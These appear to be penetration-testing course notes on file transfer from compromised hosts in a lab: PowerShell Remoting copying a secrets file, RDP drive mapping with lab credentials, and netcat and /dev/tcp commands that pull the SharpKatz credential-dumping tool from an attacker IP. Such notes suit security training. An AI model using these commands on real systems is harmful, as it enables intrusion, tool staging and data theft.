## Powershell Session File Transfer
There may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration

Example `DC01` -> `DATABASE01`
###### Test connection to 5985 on DATABASE01
```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```
###### Start PS Remoting session
```powershell
$Session = New-PSSession -ComputerName DATABASE01
```
###### Copy file from local host to DATABASE01
```powershell
Copy-Item -Path C:\secrets.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

## RDP
```bash
rdesktop 10.129.137.182 -d HTB -u administrator -p 'Password0@' -r disk:OP='/home/adot/opt'

xfreerdp3 /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:OP,/home/adot/opt
```

On Windows we can use `mstsc.exe`
![[Pasted image 20250106063450.png]]

## Netcat
#### Download
On compromised machine
```powershell
nc -l -p 8000 > pspy
ncat -l -p 8000 --recv-only > pspy
```

On our machine
```bash
nc -q 0 192.168.49.128 8000 < pspy
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
---
On our machine
```bash
nc -l -p 443 -q 0 < SharpKatz.exe
ncat -l -p 443 --send-only < SharpKatz.exe
```

On compromised host
```bash
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
